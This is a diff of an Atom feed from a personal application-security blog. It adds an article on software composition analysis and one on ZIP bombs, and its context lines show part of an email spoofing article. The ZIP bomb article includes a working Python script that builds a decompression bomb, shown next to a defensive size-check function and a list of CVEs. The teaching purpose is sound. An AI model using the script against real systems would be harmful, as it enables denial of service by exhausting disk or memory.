@@ -1,5 +1,123 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Martin Thoma - Security</title><link href="https://martin-thoma.com/" rel="alternate"></link><link href="https://martin-thoma.com/feeds/security.atom.xml" rel="self"></link><id>https://martin-thoma.com/</id><updated>2020-12-02T20:00:00+01:00</updated><subtitle>A blog about Code, the Web and Cyberculture</subtitle><entry><title>Email Spoofing 😈</title><link href="https://martin-thoma.com/https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf" rel="alternate"></link><published>2020-12-02T20:00:00+01:00</published><updated>2020-12-02T20:00:00+01:00</updated><author><name>Martin Thoma</name></author><id>tag:martin-thoma.com,2020-12-02:/https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf</id><summary type="html">&lt;p&gt;Email spoofing is the creation of emails with a forged sender address. Faking the senders&amp;rsquo; address is often a part of a &lt;strong&gt;phishing&lt;/strong&gt; attack. There are different ways to fool the victim of a phishing attack about who is the real sender: Using slightly different sender domains like security@paypal …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Email spoofing is the creation of emails with a forged sender address. Faking the senders&amp;rsquo; address is often a part of a &lt;strong&gt;phishing&lt;/strong&gt; attack. There are different ways to fool the victim of a phishing attack about who is the real sender: Using slightly different sender domains like security@paypal.co instead of security@paypal.com , hiding the senders address like in Paypal Security &lt;a href="mailto:something@phishy.com"&gt;something@phishy.com&lt;/a&gt; , or spoofing the email address.&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Martin Thoma - Security</title><link href="https://martin-thoma.com/" rel="alternate"></link><link href="https://martin-thoma.com/feeds/security.atom.xml" rel="self"></link><id>https://martin-thoma.com/</id><updated>2020-12-04T20:00:00+01:00</updated><subtitle>A blog about Code, the Web and Cyberculture</subtitle><entry><title>Software Composition Analysis (SCA)</title><link href="https://martin-thoma.com/sca/" rel="alternate"></link><published>2020-12-04T20:00:00+01:00</published><updated>2020-12-04T20:00:00+01:00</updated><author><name>Martin Thoma</name></author><id>tag:martin-thoma.com,2020-12-04:/sca/</id><summary type="html">&lt;p&gt;The job as a software developer is pretty crazy: You need to learn constantly
+about new technologies, understand topics within the domain you&amp;rsquo;re working,
+estimate how long it will take to build stuff you have never built before,
+explain issues to people who have absolutely no clue. On top …&lt;/p&gt;</summary><content type="html">&lt;p&gt;The job as a software developer is pretty crazy: You need to learn constantly
+about new technologies, understand topics within the domain you&amp;rsquo;re working,
+estimate how long it will take to build stuff you have never built before,
+explain issues to people who have absolutely no clue. On top of all that, you
+need to protect your software system against attackers. But the attackers are
+usually not a problem &amp;mdash; until they are. This means it can happen that security
+receives little attention as it seems not to provide direct value. And when the
+value becomes apparent, it&amp;rsquo;s too late.&lt;/p&gt;
+&lt;p&gt;Considering that developers are so busy with many other topics and might have a
+hard time to justify the need for security improvements, the security
+improvements need to be part of the normal workflow. You want to have something
+running completely automatically which takes care of that for you.&lt;/p&gt;
+&lt;p&gt;There are many different topics in security and many different tools. One group
+of tools do so-called &lt;em&gt;software composition analysis&lt;/em&gt; &amp;mdash; SCA in short. After
+reading this article you will understand what SCA is and how it helps you.&lt;/p&gt;
+&lt;h2 id="problem-1-malicious-third-party-software"&gt;Problem 1: Malicious Third-Party Software&lt;/h2&gt;
+&lt;p&gt;Software that is written to cause harm can get into your dependencies. Either
+by a typo and &lt;a href="https://en.wikipedia.org/wiki/Typosquatting"&gt;typosquatting&lt;/a&gt;
+attacker or by a trojan horse. A trojan horse is software that seems to be
+useful but does something else.&lt;/p&gt;
+&lt;h2 id="problem-2-vulnerable-third-party-software"&gt;Problem 2: Vulnerable Third-Party Software&lt;/h2&gt;
+&lt;p&gt;The more complex software becomes, the harder it is to have all relevant
+aspects of it in your mind. This can lead to vulnerabilities &amp;mdash; especially with
+many contributors.&lt;/p&gt;
+&lt;h2 id="problem-3-licenses-of-third-party-software"&gt;Problem 3: Licenses of Third-Party Software&lt;/h2&gt;
+&lt;p&gt;You can also run into legal issues. As an organization, you want to make your
+mind up about which licenses are acceptable. The acceptable ones will be in an
+allowlist. Then you want to automatically check any dependency regularly
+against this allowlist.&lt;/p&gt;
+&lt;p&gt;Typical licenses are MIT, BSD, Apache 2.0, LGPL, GPL, MPL.&lt;/p&gt;
+&lt;p&gt;Have a look at &lt;a href="https://tldrlegal.com/"&gt;tldrlegal.com&lt;/a&gt; to get a quick overview.&lt;/p&gt;
+&lt;h2 id="how-sca-works"&gt;How SCA works&lt;/h2&gt;
+&lt;p&gt;Checking for malicious and vulnerable third-party packages is simple:
+Blocklists. If a version of a package (or the complete package) is known to
+cause problems, it gets on a blocklist. SCA tools can check the blocklists and
+prevent you from installing problematic software.&lt;/p&gt;
+&lt;p&gt;For the licenses, you need to have a way to extract the licenses from a
+package. Some important things to consider:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Package authors can add alternative licenses&lt;/li&gt;
+&lt;li&gt;Package authors can add multiple licenses which all need to be fulfilled&lt;/li&gt;
+&lt;li&gt;Package authors can (technically) not give any license &amp;mdash; that means you
+  cannot use it!&lt;/li&gt;
+&lt;li&gt;Package authors can give inconsistent licenses, e.g. in Python, there are at
+  least 3 different common ways where you can denote the license.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="prerequisite-bill-of-materials-bom"&gt;Prerequisite: Bill of Materials (BOM)&lt;/h2&gt;
+&lt;p&gt;You need to know which third-party software you are using. For that, you create
+a so-called &lt;em&gt;Bill of Materials&lt;/em&gt;. Sounds fancy, but it really is just a list of
+the software you use. The programming languages typically come already with
+solutions for that:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Java&lt;/strong&gt;: pom.xml (see
+  &lt;a href="https://maven.apache.org/guides/introduction/introduction-to-dependency-mechanism.html"&gt;dependencies&lt;/a&gt;)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;a href="https://classic.yarnpkg.com/en/docs/yarn-lock/"&gt;yarn.lock&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;PHP&lt;/strong&gt;: &lt;a href="https://getcomposer.org/doc/02-libraries.md#lock-file"&gt;composer.lock&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Python&lt;/strong&gt;: requirements.txt files with transitively-pinned dependencies,
+  e.g. via pip-compile from &lt;a href="https://pypi.org/project/pip-tools"&gt;pip-tools&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Ruby&lt;/strong&gt;: &lt;a href="https://bundler.io/rationale.html"&gt;Gemfile.lock&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Rust&lt;/strong&gt;: Cargo.tom &amp;mdash; I&amp;rsquo;m uncertain if that contains transitive dependencies
+  (see
+  &lt;a href="https://doc.rust-lang.org/cargo/reference/specifying-dependencies.html"&gt;dependencies&lt;/a&gt;)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Please let me know about how this is called in other languages &amp;mdash; I will expand
+this list then.&lt;/p&gt;
+&lt;h2 id="examples-for-sca-tools"&gt;Examples for SCA Tools&lt;/h2&gt;
+&lt;p&gt;Free solutions:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;a href="https://classic.yarnpkg.com/en/docs/cli/audit/"&gt;yarn audit&lt;/a&gt;
+  for vulnerabilities and &lt;a href="https://classic.yarnpkg.com/en/docs/cli/licenses/"&gt;yarn
+  licenses&lt;/a&gt; + scripting
+  around it for licenses.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;a href="https://pypi.org/project/safety/"&gt;safety&lt;/a&gt; for vulnerabilities,
+  &lt;a href="https://pypi.org/project/pip-licenses/"&gt;pip-licenses&lt;/a&gt; for licenses.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Commercial solutions:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://www.blackducksoftware.com/"&gt;Blackduck&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://dependabot.com/"&gt;Dependabot&lt;/a&gt;: I&amp;rsquo;ve seen this on Github some times.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://snyk.io/product/open-source-security-management/"&gt;Snyk&lt;/a&gt; for
+  vulnerabilities: You can see it in Github pretty often. It&amp;rsquo;s free for
+  open-source software.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="summary"&gt;Summary&lt;/h2&gt;
+&lt;p&gt;Software Composition Analysis (SCA) tools can help you a lot and usually stay
+in the background. Integrate them in your Continuous Integration (CI) pipeline,
+run them regularly as a scheduled task. In most cases, you don&amp;rsquo;t have to do
+anything. But when the tool complains, it is important.&lt;/p&gt;
+&lt;h2 id="whats-next"&gt;What&amp;rsquo;s next?&lt;/h2&gt;
+&lt;p&gt;In this series about application security (AppSec) we already explained some of the techniques of the attackers 😈 and also techniques of the defenders 😇:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Part 1: &lt;a href="https://medium.com/faun/sql-injections-e8bc9a14c95"&gt;SQL Injections&lt;/a&gt; 😈&lt;/li&gt;
+&lt;li&gt;Part 2: &lt;a href="https://levelup.gitconnected.com/leaking-secrets-240a3484cb80"&gt;Don&amp;rsquo;t leak Secrets&lt;/a&gt; 😇&lt;/li&gt;
+&lt;li&gt;Part 3: &lt;a href="https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f"&gt;Cross-Site Scripting (XSS)&lt;/a&gt; 😈&lt;/li&gt;
+&lt;li&gt;Part 4: &lt;a href="https://levelup.gitconnected.com/password-hashing-eb3b97684636"&gt;Password Hashing&lt;/a&gt; 😇&lt;/li&gt;
+&lt;li&gt;Part 5: &lt;a href="https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112"&gt;ZIP Bombs&lt;/a&gt; 😈&lt;/li&gt;
+&lt;li&gt;Part 6: &lt;a href="https://medium.com/plain-and-simple/captcha-500991bd90a3"&gt;CAPTCHA&lt;/a&gt; 😇&lt;/li&gt;
+&lt;li&gt;Part 7: &lt;a href="https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf"&gt;Email Spoofing&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Part 8: &lt;a href="https://medium.com/python-in-plain-english/software-composition-analysis-sca-7e573214a98e"&gt;Software Composition Analysis&lt;/a&gt; (SCA) 😇&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;And this is about to come:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;CSRF 😈&lt;/li&gt;
+&lt;li&gt;DOS 😈&lt;/li&gt;
+&lt;li&gt;Credential Stuffing 😈&lt;/li&gt;
+&lt;li&gt;Cryptojacking 😈&lt;/li&gt;
+&lt;li&gt;Single-Sign-On 😇&lt;/li&gt;
+&lt;li&gt;Two-Factor Authentication 😇&lt;/li&gt;
+&lt;li&gt;Backups 😇&lt;/li&gt;
+&lt;li&gt;Disk Encryption 😇&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Let me know if you are interested in more articles around AppSec / InfoSec!&lt;/p&gt;</content><category term="Security"></category><category term="Security"></category><category term="SCA"></category></entry><entry><title>Email Spoofing 😈</title><link href="https://martin-thoma.com/https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf" rel="alternate"></link><published>2020-12-02T20:00:00+01:00</published><updated>2020-12-02T20:00:00+01:00</updated><author><name>Martin Thoma</name></author><id>tag:martin-thoma.com,2020-12-02:/https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf</id><summary type="html">&lt;p&gt;Email spoofing is the creation of emails with a forged sender address. Faking the senders&amp;rsquo; address is often a part of a &lt;strong&gt;phishing&lt;/strong&gt; attack. There are different ways to fool the victim of a phishing attack about who is the real sender: Using slightly different sender domains like security@paypal …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Email spoofing is the creation of emails with a forged sender address. Faking the senders&amp;rsquo; address is often a part of a &lt;strong&gt;phishing&lt;/strong&gt; attack. There are different ways to fool the victim of a phishing attack about who is the real sender: Using slightly different sender domains like security@paypal.co instead of security@paypal.com , hiding the senders address like in Paypal Security &lt;a href="mailto:something@phishy.com"&gt;something@phishy.com&lt;/a&gt; , or spoofing the email address.&lt;/p&gt;
 &lt;h2 id="why-it-matters"&gt;Why it Matters&lt;/h2&gt;
 &lt;p&gt;Business Email Compromise (BEC) is a form of fraud that uses a business email address. There are many examples of this, but they are not well documented. At least not publicly. Some of the bigger ones I&amp;rsquo;ve found are:&lt;/p&gt;
 &lt;ul&gt;
@@ -147,6 +265,7 @@ _dmarc.google.com. &lt;span class="m"&gt;290&lt;/span&gt; IN TXT &lt;span class=
 &lt;li&gt;Part 5: &lt;a href="https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112"&gt;ZIP Bombs&lt;/a&gt; 😈&lt;/li&gt;
 &lt;li&gt;Part 6: &lt;a href="https://medium.com/plain-and-simple/captcha-500991bd90a3"&gt;CAPTCHA&lt;/a&gt; 😇&lt;/li&gt;
 &lt;li&gt;Part 7: &lt;a href="https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf"&gt;Email Spoofing&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Part 8: &lt;a href="https://medium.com/python-in-plain-english/software-composition-analysis-sca-7e573214a98e"&gt;Software Composition Analysis&lt;/a&gt; (SCA) 😇&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;And this is about to come:&lt;/p&gt;
 &lt;ul&gt;
@@ -159,4 +278,580 @@ _dmarc.google.com. &lt;span class="m"&gt;290&lt;/span&gt; IN TXT &lt;span class=
 &lt;li&gt;Backups 😇&lt;/li&gt;
 &lt;li&gt;Disk Encryption 😇&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;Let me know if you are interested in more articles around AppSec / InfoSec!&lt;/p&gt;</content><category term="Security"></category><category term="Security"></category><category term="email"></category></entry></feed>
+&lt;p&gt;Let me know if you are interested in more articles around AppSec / InfoSec!&lt;/p&gt;</content><category term="Security"></category><category term="Security"></category><category term="email"></category><category term="InfoSec"></category></entry><entry><title>ZIP Bombs 💣😈</title><link href="https://martin-thoma.com/https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112" rel="alternate"></link><published>2020-10-28T20:00:00+01:00</published><updated>2020-10-28T20:00:00+01:00</updated><author><name>Martin Thoma</name></author><id>tag:martin-thoma.com,2020-10-28:/https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112</id><summary type="html">&lt;p&gt;A &lt;a href="https://en.wikipedia.org/wiki/Zip_bomb"&gt;zip bomb&lt;/a&gt; is a zip file that is designed to take an enormous amount of space once it is unpacked. The best-known one is called 42.zip and has a size of &lt;strong&gt;42kB&lt;/strong&gt;. It contains recursively nested zip-files. On the lowest level, there is a single file which decompresses …&lt;/p&gt;</summary><content type="html">&lt;p&gt;A &lt;a href="https://en.wikipedia.org/wiki/Zip_bomb"&gt;zip bomb&lt;/a&gt; is a zip file that is designed to take an enormous amount of space once it is unpacked. The best-known one is called 42.zip and has a size of &lt;strong&gt;42kB&lt;/strong&gt;. It contains recursively nested zip-files. On the lowest level, there is a single file which decompresses to a size of 4.3GB . This file is added in total over a million times to the archive, leading to a total unpacked size of &lt;strong&gt;4.5PB&lt;/strong&gt; . This is well over the size of any available storage system.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;h1 id="zip-bombs-are-a-form-of-decompression-bomb-decompression-bombs-are-compressed-files-which-extract-to-a-crazy-file-size-decompression-bombs-are-a-form-of-denial-of-service-attacks"&gt;Zip bombs are a form of decompression bomb. Decompression bombs are compressed files which extract to a crazy file size. Decompression bombs are a form of denial-of-service attacks.&lt;/h1&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Unpacking such an archive can lead in various systems to problems which are all connected to running either out of memory or out of disk space. For example, an anti-virus scanner might unpack the ZIP file and thus get killed due to memory exhaustion. A backend server might fill up its disk and no longer be able to operate.&lt;/p&gt;
+&lt;h2 id="how-to-create-a-zip-bomb"&gt;How to create a ZIP bomb&lt;/h2&gt;
+&lt;p&gt;The simplest ZIP bombs are super easy to create. You can simply use the packages found within Python:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
+&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;tempfile&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;mkstemp&lt;/span&gt;
+&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;zipfile&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;ZIP_LZMA&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ZipFile&lt;/span&gt;
+
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;create_txt_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;size_in_byte&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;handle&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;filepath&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mkstemp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;suffix&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;".txt"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;prefix&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"zip-txt-"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;handle&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filepath&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;"w"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;fp&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="n"&gt;fp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"0"&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;size_in_byte&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;filepath&lt;/span&gt;
+
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;create_zipbomb&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;inner_file_size&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;nb_inner_files&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="n"&gt;filepath&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;create_txt_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;size_in_byte&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;inner_file_size&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="n"&gt;ZipFile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"zipbomb.zip"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;"w"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ZIP_LZMA&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;myzip&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;nb_inner_files&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+            &lt;span class="n"&gt;myzip&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filepath&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;.txt"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+            &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;remove&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filepath&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;"__main__"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;create_zipbomb&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;inner_file_size&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;nb_inner_files&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;David Fifield also proved that it&amp;rsquo;s possible to create a zip bomb with has 42MB and extracts to 4.5PB in a &lt;strong&gt;non-recursive&lt;/strong&gt; way (&lt;a href="https://www.bamsoftware.com/hacks/zipbomb/"&gt;source&lt;/a&gt;).&lt;/p&gt;
+&lt;p&gt;There are also quines for ZIP files. A quine is a program that produces its source code as output. A ZIP-quine contains itself when uncompressed. One well-known one is droste.zip (&lt;a href="https://alf.nu/ZipQuine"&gt;source&lt;/a&gt;), but there are more (&lt;a href="https://research.swtch.com/zip"&gt;source&lt;/a&gt;).&lt;/p&gt;
+&lt;p&gt;You might also be able to create them manually by investigating the &lt;a href="https://www.iso.org/standard/60101.html"&gt;ZIP standard&lt;/a&gt; and crafting the file.&lt;/p&gt;
+&lt;h2 id="should-i-be-worried"&gt;Should I be worried?&lt;/h2&gt;
+&lt;p&gt;I wouldn&amp;rsquo;t be worried. As &lt;a href="https://en.wikipedia.org/wiki/Tavis_Ormandy"&gt;Travis Ormandy&lt;/a&gt; pointed out, 21 out of 58 anti-virus programs could detect the zip bomb. 6 timed out, 11 could not process the files and 20 thought the file is fine.&lt;/p&gt;
+&lt;p&gt;This article is more of a friendly reminder that this type of attack exists and that one should be careful when archives are unpacked.&lt;/p&gt;
+&lt;p&gt;I found this topic in a couple of places:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;2005: bzip2 (&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2005-1260"&gt;CVE-2005&amp;ndash;1260&lt;/a&gt;)&lt;/li&gt;
+&lt;li&gt;2009: Apache Tika (&lt;a href="https://issues.apache.org/jira/browse/TIKA-259?attachmentSortBy=fileName"&gt;Safe parsing of droste.zip&lt;/a&gt;)&lt;/li&gt;
+&lt;li&gt;2018: Akka (&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2018-16131"&gt;CVE-2018&amp;ndash;16131&lt;/a&gt;)&lt;/li&gt;
+&lt;li&gt;2019: Python (&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2019-9674"&gt;CVE-2019&amp;ndash;9674&lt;/a&gt;)&lt;/li&gt;
+&lt;li&gt;2019: Info-ZIP (&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2019-13232"&gt;CVE-2019&amp;ndash;13232&lt;/a&gt;)&lt;/li&gt;
+&lt;li&gt;2019: ClamAV (&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12625"&gt;CVE-2019&amp;ndash;12625&lt;/a&gt;)&lt;/li&gt;
+&lt;li&gt;2020: Wireshark (&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2020-25866"&gt;CVE-2020&amp;ndash;25866&lt;/a&gt;)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="get-the-size-of-a-zip-file-without-extracting-data"&gt;Get the size of a ZIP file without extracting data&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;zipfile&lt;/span&gt;
+
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_extracted_size&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filepath&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="sd"&gt;"""Get the extracted size in bytes."""&lt;/span&gt;
+    &lt;span class="n"&gt;zp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;zipfile&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ZipFile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filepath&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;zinfo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;file_size&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;zinfo&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;zp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filelist&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Simple enough, isn&amp;rsquo;t it?&lt;/p&gt;
+&lt;p&gt;The problem is that you can nest ZIP files. So the extracted files could again contain zipped files. If you apply recursion, you might want to have a maximum recursion depth and keep track of the used memory/disk space.&lt;/p&gt;
+&lt;h2 id="the-state-of-av-software"&gt;The State of AV Software&lt;/h2&gt;
+&lt;p&gt;I was curious to know if anti-virus software can detect zip bombs. So I tested some and contacted some of the developers.&lt;/p&gt;
+&lt;h3 id="virustotal"&gt;Virustotal&lt;/h3&gt;
+&lt;p&gt;&lt;a href="https://en.wikipedia.org/wiki/VirusTotal"&gt;Virustotal&lt;/a&gt; offers a form where users can upload files and check the results of various programs. Here are the results for my test files:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://www.virustotal.com/gui/file/bbd05de19aa2af1455c0494639215898a15286d9b05073b6c4817fe24b2c36fa/detection"&gt;42.zip&lt;/a&gt;: Only &lt;a href="https://en.wikipedia.org/wiki/Fortinet"&gt;Fortinet&lt;/a&gt; detected it. 12 programs were unable to process it.&lt;/li&gt;
